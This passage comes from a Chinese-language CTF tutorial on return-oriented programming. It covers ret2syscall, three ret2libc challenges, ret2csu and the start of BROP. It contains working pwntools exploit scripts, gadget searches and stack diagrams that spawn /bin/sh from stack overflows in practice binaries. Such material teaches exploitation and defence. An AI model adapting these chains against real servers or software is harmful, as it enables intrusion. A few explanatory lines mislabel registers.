1, 0);\n  puts(\"This time, no system() and NO SHELLCODE!!!\");\n  puts(\"What do you plan to do?\");\n  gets(&v4);\n  return 0;\n}\n```\n\n3.可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以我们需要覆盖的返回地址相对于v4的偏移为112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。\n\n4.简单地说，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行int 0x80就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取shell\n\n```c\nexecve(\"/bin/sh\",NULL,NULL)\n```\n\n其中，该程序是32位，所以我们需要使得\n\n- 系统调用号即eax应该为0xb\n- 第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以\n- 第二个参数即ecx应该为0\n- 第三个参数edx应该为0\n\n而我们如何控制这些寄存器的值 呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在gadgets最后使用ret来再次控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。\n\n5.首先，我们来寻找控制eax的gadgets\n\n```assembly\n➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x080bb196 : pop eax ; ret\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es  ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n```\n\n6.可以看到有上述几个都可以控制eax，那我就选取第二个来作为我的gadgets。\n\n类似的，我们可以得到控制其它寄存器的gadgets\n\n```assembly\nret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret\n0x0805c820 : pop esi ; pop ebx ; ret\n0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0807b6ed : pop ss ; pop ebx ; ret\n```\n\n这里，我选择\n\n```assembly\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n```\n\n这个可以直接控制其它三个寄存器。\n\n7.此外，我们需要获得/bin/sh字符串对应的地址。\n\n```assembly\n➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh'\nStrings information\n============================================================\n0x080be408 : /bin/sh\n```\n\n8.可以找到对应的地址，此外，还有int 0x80的地址，如下\n\n```assembly\n➜  ret2syscall ROPgadget --binary rop  --only 'int'                 \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080938fe : int 0xbb\n0x080869b5 : int 0xf6\n0x0807b4d4 : int 0xfc\nUnique gadgets found: 4\n```\n\n同时，也找到对应的地址了。\n\n9.下面就是对应的payload,其中0xb为execve对应的系统调用号。\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./rop')\npop_eax_ret = 0x080bb196\npop_edx_ecx_ebx_ret = 0x0806eb90\nint_0x80 = 0x08049421\nbinsh = 0x80be408\npayload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\nsh.sendline(payload)\nsh.interactive()\n```\n\n**栈布局**\n\npayload栈中部署：\n\n```assembly\n                       +---------------------------+\n                       |         int_0x80          | int_0x80指令部署(等待被执行)\n                       +---------------------------+\n                       |          bin_sh           | execve第一个参数部署(等待pop到edx中)\n                       +---------------------------+\n                       |            0              | execve第二个参数部署(等待pop到ecx中)\n                       +---------------------------+\n                       |            0              | execve第三个参数部署(等待pop到ebx中)\n                       +---------------------------+\n                       |pop_edx_pop_ecx_pop_ebx_ret| 执行pop ebx、ecx、edx ret地址\n                       +---------------------------+\n                       |           0xb             | 系统调用号部署（等待pop到eax寄存器中） \n                       +---------------------------+\n                       |       pop_eax_ret         | 执行pop eax ret地址，覆盖原ret返回位置\n                       +---------------------------+\n                       |           kdig            | 'hollkdig'覆盖原saved ebp位置\n                ebp--->+---------------------------+\n                       |           holl            | 'hollkdig'占位填满栈空间\n                       |           ....            | 'hollkdig'占位填满栈空间\n                       |           kdig            | 'hollkdig'占位填满栈空间\n                       |           holl            | 'hollkdig'占位填满栈空间\n                       |           kdig            | 'hollkdig'占位填满栈空间\n                       |           holl            | 'hollkdig'占位填满栈空间\n  v4终止位置,ebp-0x64-->+---------------------------+\n```\n\n执行流程：\n\n```assembly\neip ---> pop_eax_ret gadget地址\t\t\t\t   (由于pop_eax_ret覆盖了原ret地址，所以eip指向gadget并执行)\nesp ---> 0xb\t\t\t\t\t\t\t\t    (此时esp指向部署到栈中的0xb)\neax = 0xb\t\t\t\t\t\t\t\t\t\t(pop eax后将0xb压入eax寄存器)\neip ---> pop_edx_pop_ecx_pop_ebx_ret gadget地址  \n\t\t\t\t\t\t\t\t\t\t     (由于pop eax结束后进行ret操作，所以eip继续指向第二个gadget并执行)\nesp ---> 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)\nebx = 0\t\t\t\t\t\t\t\t\t\t (pop ebx后将0压入ebx寄存器)\nesp ---> 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)\necx = 0\t\t\t\t\t\t\t\t\t\t (pop ecx后将0压入ecx寄存器)\nesp ---> bin_sh地址\t\t\t \t\t        (此时esp指向部署到栈中的execve第三个参数bin_sh地址)\nedx = bin_sh地址\t\t\t\t\t            (pop edx后将bin_sh地址压入eax寄)\n执行int_0x80                                  (由于执行完pop ebx、ecx、edx后进行ret操作，所以eip指向最后的int)\n```\n\n**基本ROP**-**ret2libc**\n\nret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。一般情况下，我们会选择执行system(\"/bin/sh\")，故而此时我们需要知道system函数的地址。\n\n**以bamboofox中ret2libc1**\n\n1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。\n\n```c\n➜  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"RET2LIBC >_<\");\n  gets((char *)&v4);\n  return 0;\n}\n```\n\n3.此外，利用ropgadget，我们可以查看是否有/bin/sh存在\n\n```c\n➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          \nStrings information\n============================================================\n0x08048720 : /bin/sh\n```\n\n确实存在，再次查找一下是否有system函数存在。经在ida中查找，确实也存在。\n\n```assembly\n.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]\n```\n\n4.那么，我们直接返回该处，即执行system函数。相应的payload如下\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2libc1')\nbinsh_addr = 0x8048720\nsystem_plt = 0x08048460\npayload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])\nsh.sendline(payload)\nsh.interactive()\n```\n\n这里我们需要注意函数调用栈的结构，如果是正常调用system函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb'作为虚假的地址，其后参数对应的参数内容。\n\n这个例子，相对来说，最为简单，同时提供了system地址与/bin/sh的地址，但是大多数程序并不会有这么好的情况。\n\n**以bamboofox中的ret2libc2为例**\n\n1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。\n\n```assembly\n➜  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\nsetvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"RET2LIBC >_<\");\n  gets((char *)&v4);\n  return 0;\n}\n```\n\n3.该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system(\"/bin/sh\")。\n\n4.首先需要在bss段找一块地址写我们的/bin/sh的字符串，我们可以发现bss段有个buf2的变量，未被使用\n\n```assembly\n.bss:0804A080 buf2            db 64h dup(?)\n.bss:0804A080 _bss            ends\n```\n\n那么构造如下： \n\n```c\ngets(buf2);\nsystem(buf2);\n```\n\n那么先让返回地址为gets函数地址，参数为buf2地址，下一层返回地址需要弹出栈顶的buf2，然后跳到system地址去执行，那么就需要找一个pop|ret的gadget\n\n```assembly\nROPgadget --binary ret2libc2 --only \"pop|ret\"\nGadgets information\n============================================================\n0x0804872f : pop ebp ; ret\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret\n0x0804872e : pop edi ; pop ebp ; ret\n0x0804872d : pop esi ; pop edi ; pop ebp ; ret\n0x08048426 : ret\n0x0804857e : ret 0xeac1\nUnique gadgets found: 7\n```\n\n这里我们选择0x0804843d这个地址\n\n5.利用脚本如下所示：\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2libc2')\ngets_plt = 0x08048460\nsystem_plt = 0x08048490\npop_ebx = 0x0804843d\nbuf2 = 0x804a080\npayload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])\nsh.sendline(payload)\nsh.sendline('/bin/sh')\nsh.interactive()\n```\n\n需要注意的是，我这里向程序中bss段的buf2处写入/bin/sh字符串，并将其地址作为system的参数传入。这样以便于可以获得shell。\n\n**以bamboofox中的ret2libc3为例**\n\n在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。\n\n1.首先，查看安全保护。可以看出，源程序仍旧开启了堆栈不可执行保护。\n\n➜ ret2libc3 checksec ret2libc3\n   Arch:   i386-32-little\n   RELRO:  Partial RELRO\n   Stack:  No canary found\n   NX:    NX enabled\n   PIE:   No PIE (0x8048000)\n\n2.进而查看源码，发现程序的bug仍然是栈溢出。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n {\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"No surprise anymore, system disappeard QQ.\");\n  printf(\"Can you find it !?\");\n  gets((char *)&v4);\n  return 0;\n }\n```\n\n3.那么我们如何得到system函数的地址呢？这里就主要利用了两个知识点\n\n- system函数属于libc，而libc.so文件中的函数之间相对偏移是固定的。\n- 即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而libc在github上有人进行收集（libc-database），具体细节如下\n\n所以如果我们知道libc中某个函数的地址，那么我们就可以确定该程序利用的libc。进而我们就可以知道system函数的地址。\n\n那么如何得到libc中的某个函数的地址呢？我们一般常用的方法是采用got表泄露，即输出某个函数对应的got表项的内容。**当然，由于libc的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露。**\n\n我们自然可以根据上面的步骤先得到libc，之后在程序中查询偏移，然后再次获取system地址，但这样手工操作次数太多，有点麻烦，github上有一个libc的利用工具（LibcSearcher），具体细节请参考readme\n\n此外，在得到libc之后，其实libc中也是有/bin/sh字符串的，所以我们可以一起获得/bin/sh字符串的地址。\n\n4.这里我们泄露__libc_start_main的地址，这是因为它是程序最初被执行的地方。基本利用思路如下\n\n- 泄露__libc_start_main地址\n- 获取libc版本(这里借助的是LibcSearcher)\n- 获取system地址与/bin/sh的地址\n- 再次执行源程序\n- 触发栈溢出执行system(‘/bin/sh’)\n\nexp如下???\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\nsh = process('./ret2libc3')\nret2libc3 = ELF('./ret2libc3')\nputs_plt = ret2libc3.plt['puts']\nlibc_start_main_got = ret2libc3.got['__libc_start_main']\nmain = ret2libc3.symbols['main']\nprint \"leak libc_start_main_got addr and return to main again\"\npayload = flat(['A' * 112, puts_plt, main, libc_start_main_got])\nsh.sendlineafter('Can you find it !?', payload)\nprint \"get the related addr\"\nlibc_start_main_addr = u32(sh.recv()[0:4])\nlibc = LibcSearcher('__libc_start_main', libc_start_main_addr)\nlibcbase = libc_start_main_addr - libc.dump('__libc_start_main')\nsystem_addr = libcbase + libc.dump('system')\nbinsh_addr = libcbase + libc.dump('str_bin_sh')\nprint \"get shell\"\npayload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])\nsh.sendline(payload)\nsh.interactive()\n```\n\n**shell获取小结**\n\n这里总结几种常见的获取shell的方式：\n\n- 执行shellcode，这一方面也会有不同的情况\n\n- - 可以直接返回shell\n  - 可以将shell返回到某一个端口\n  - shellcode中字符有时候需要满足不同的需求\n  - **注意，我们需要将shellcode写在可以执行的内存区域中。**\n\n- 执行     system(\"/bin/sh\"), system('sh') 等等\n\n- - 关于 system的地址，参见下面章节的**地址寻找**。\n\n  - 关于 \"/bin/sh\",“sh”\n\n  - - 首先寻找 binary 里面有没有对应的字符串，**比如说有 flush 函数，那就一定有 sh 了**\n    - 考虑个人读取对应字符串\n    - libc 中其实是有 /bin/sh 的\n\n  - 优点\n\n  - - 只需要一个参数。\n\n  - 缺点\n\n  - - **有可能因为破坏环境变量而无法执行。**\n\n- 执行     execve(\"/bin/sh\",NULL,NULL)\n\n- - 前几条同 system\n\n  - 优点\n\n  - - 几乎不受环境变量的影响。\n\n  - 缺点\n\n  - - **需要 3 个参数。**\n\n- 系统调用\n\n- - 系统调用号 11(0xb)\n\n**地址寻找小结**\n\n在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种\n\n**通用寻找**\n\n**直接地址寻找**\n\n程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。\n\n**got表寻找**\n\n有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（**前提是这个函数已经被解析一次了**）。\n\n**有libc**\n\n**相对偏移寻找**，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。**注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。**常见的有wapper的函数有（待补充）。\t\n\n**无libc**\n\n其实，这种情况的解决策略分为两种\n\n- 想办法获取libc\n- 想办法直接获取对应的地址。\n\n而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。\n\n- puts会有\\x00截断的问题\n- write可以指定长度输出的内容。\n\n下面是一些相应的方法\n\n**DynELF**\n\n前提是我们可以泄露任意地址的内容。\n\n- **如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。**\n\n**libc数据库**\n\n\\## 更新数据库\n ./get\n \\## 将已有libc添加到数据库中\n ./add libc.so\n \\## Find all the libc's in the database that have the given names at the given addresses.\n ./find function1 addr function2 addr\n \\## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.\n ./Dump some useful offsets\n\n去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。\n\n- libcdb.com\n\n**当然，还有上面提到的LibcSearcher。**\n\n**ret2dl-resolve**\n\n当ELF文件采用动态链接时，got表会采用延迟绑定技术。当第一次调用某个libc函数时，程序会调用_dl_runtime_resolve函数对其地址解析。因此，我们可以利用栈溢出构造ROP链，伪造对其他函数（如：system）的解析。这也是我们在高级rop中会介绍的技巧。\n\n### 中级了@@@o(*￣▽￣*)ブ！！！\n\n**ret2__libc_scu_init**\n\n中级ROP主要是使用了一些比较巧妙的Gadgets。\n\n在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)\n\n```assembly\n.text:00000000004005C0 ; void _libc_csu_init(void)\n.text:00000000004005C0                 public __libc_csu_init\n.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o\n.text:00000000004005C0                 push    r15\n.text:00000000004005C2                 push    r14\n.text:00000000004005C4                 mov     r15d, edi\n.text:00000000004005C7                 push    r13\n.text:00000000004005C9                 push    r12\n.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry\n.text:00000000004005D2                 push    rbp\n.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004005DA                 push    rbx\n.text:00000000004005DB                 mov     r14, rsi\n.text:00000000004005DE                 mov     r13, rdx\n.text:00000000004005E1                 sub     rbp, r12\n.text:00000000004005E4                 sub     rsp, 8\n.text:00000000004005E8                 sar     rbp, 3\n.text:00000000004005EC                 call    _init_proc\n.text:00000000004005F1                 test    rbp, rbp\n.text:00000000004005F4                 jz      short loc_400616\n.text:00000000004005F6                 xor     ebx, ebx\n.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]\n.text:0000000000400600\n.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j\n.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n.text:0000000000400616\n.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j\n.text:0000000000400616                 add     rsp, 8\n.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n```\n\n这里我们可以利用以下几点\n\n- 从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。\n- 从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，**但其实此时rdi的高32位寄存器值为0（自行调试）**，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。\n- 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。\n\n蒸米的一步一步学ROP之linux_x64篇中level5为例\n\n1.首先检查程序的安全保护\n\n➜ ret2__libc_csu_init git:(iromise) ✗ checksec level5  \n   Arch:   amd64-64-little\n   RELRO:  Partial RELRO\n   Stack:  No canary found\n   NX:    NX enabled\n   PIE:   No PIE (0x400000)\n\n程序为64位，开启了堆栈不可执行保护。\n\n2.其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出\n\n```c\nssize_t vulnerable_function()\n{\n  char buf; // [sp+0h] [bp-80h]@1\n  return read(0, &buf, 0x200uLL);\n}\n```\n\n简单浏览下程序，发现程序中既没有system函数地址，也没有/bin/sh字符串，所以两者都需要我们自己去构造了。\n\n**注：这里我尝试在我本机使用system函数来获取shell失败了，应该是环境变量的问题，所以这里使用的是execve来获取shell。**\n\n3.基本利用思路如下：\n\n- 利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数\n- 根据libcsearcher获取对应libc版本以及execve函数地址\n- 再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及'/bin/sh’地址，并使得程序重新执行main函数。\n- 再次利用栈溢出执行libc_csu_gadgets执行execve('/bin/sh')获取shell。\n\nexp如下\n\n```python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\n##context.log_level = 'debug'\nlevel5 = ELF('./level5')\nsh = process('./level5')\nwrite_got = level5.got['write']\nread_got = level5.got['read']\nmain_addr = level5.symbols['main']\nbss_base = level5.bss()\ncsu_front_addr = 0x0000000000400600\ncsu_end_addr = 0x000000000040061A\nfakeebp = 'b' * 8\ndef csu(rbx, rbp, r12, r13, r14, r15, last):\n    # pop rbx,rbp,r12,r13,r14,r15\n    # rbx should be 0,\n    # rbp should be 1,enable not to jump\n    # r12 should be the function we want to call\n    # rdi=edi=r15d\n    # rsi=r14\n    # rdx=r13\n    payload = 'a' * 0x80 + fakeebp\n    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(\n        r13) + p64(r14) + p64(r15)\n    payload += p64(csu_front_addr)\n    payload += 'a' * 0x38\n    payload += p64(last)\n    sh.send(payload)\n    sleep(1)\nsh.recvuntil('Hello, World\\n')\n## RDI, RSI, RDX, RCX, R8, R9, more on the stack\n## write(1,write_got,8)\ncsu(0, 1, write_got, 8, write_got, 1, main_addr)\nwrite_addr = u64(sh.recv(8))\nlibc = LibcSearcher('write', write_addr)\nlibc_base = write_addr - libc.dump('write')\nexecve_addr = libc_base + libc.dump('execve')\nlog.success('execve_addr ' + hex(execve_addr))\n##gdb.attach(sh)\n## read(0,bss_base,16)\n## read execve_addr and /bin/sh\\x00\nsh.recvuntil('Hello, World\\n')\ncsu(0, 1, read_got, 16, bss_base, 0, main_addr)\nsh.send(p64(execve_addr) + '/bin/sh\\x00')\nsh.recvuntil('Hello, World\\n')\n## execve(bss_base+8)\ncsu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)\nsh.interactive()\n```\n\n**改进**\n\n在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法\n\n**改进1-提前控制rbx与rbp**\n\n可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数，那么我们就可以减少16字节，即我们所需的字节数只需要112。\n\n**改进2-多次利用**\n\n其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件\n\n- 漏洞可以被多次触发\n- 在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。\n\n**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**\n\n**gadget**\n\n其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数\n\n```c\n_init\n_start\ncall_gmon_start\nderegister_tm_clones\nregister_tm_clones\n__do_global_dtors_aux\nframe_dummy\n__libc_csu_init\n__libc_csu_fini\n_fini\n```\n\n我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。\n\n需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器\n\n- 利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。\n- 利用中间部分的代码控制了rdx，rsi，edi。\n\n而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下\n\n```assembly\ngef➤  x/5i 0x000000000040061A\n   0x40061a <__libc_csu_init+90>:   pop    rbx\n   0x40061b <__libc_csu_init+91>:   pop    rbp\n   0x40061c <__libc_csu_init+92>:   pop    r12\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\ngef➤  x/5i 0x000000000040061b\n   0x40061b <__libc_csu_init+91>:   pop    rbp\n   0x40061c <__libc_csu_init+92>:   pop    r12\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\ngef➤  x/5i 0x000000000040061A+3\n   0x40061d <__libc_csu_init+93>:   pop    rsp\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret\ngef➤  x/5i 0x000000000040061e\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\ngef➤  x/5i 0x000000000040061f\n   0x40061f <__libc_csu_init+95>:   pop    rbp\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\ngef➤  x/5i 0x0000000000400620\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\n   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]\ngef➤  x/5i 0x0000000000400621\n   0x400621 <__libc_csu_init+97>:   pop    rsi\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\ngef➤  x/5i 0x000000000040061A+9\n   0x400623 <__libc_csu_init+99>:   pop    rdi\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\n   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]\n   0x400630 <__libc_csu_fini>:  repz ret\n```\n\n**参考题目**\n\n- 2016 XDCTF pwn100\n- 2016 华山杯 SU_PWN\n\n**BROP**\n\nBROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是**Hacking Blind**\n\nBROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流.\n\n1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。\n2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx,     MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。\n\n目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。\n\n**基本思路**\n\n在BROP中，基本的遵循的思路如下\n\n- 判断栈溢出长度\n\n- - 暴力枚举\n\n- Stack Reading\n\n- - 获取栈上的数据来泄露canaries，以及ebp和返回地址。\n\n- Bind ROP\n\n- - 找到足够多的 gadgets      来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。\n\n- Build the exploit\n\n- - 利用输出函数来 dump      出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit\n\n**栈溢出长度**\n\n直接从1暴力枚举即可，直到发现程序崩溃。\n\n**Stack Reading**\n\n如下所示，这是目前经典的栈布局\n\n```assembly\nbuffer|canary|saved fame pointer|saved returned 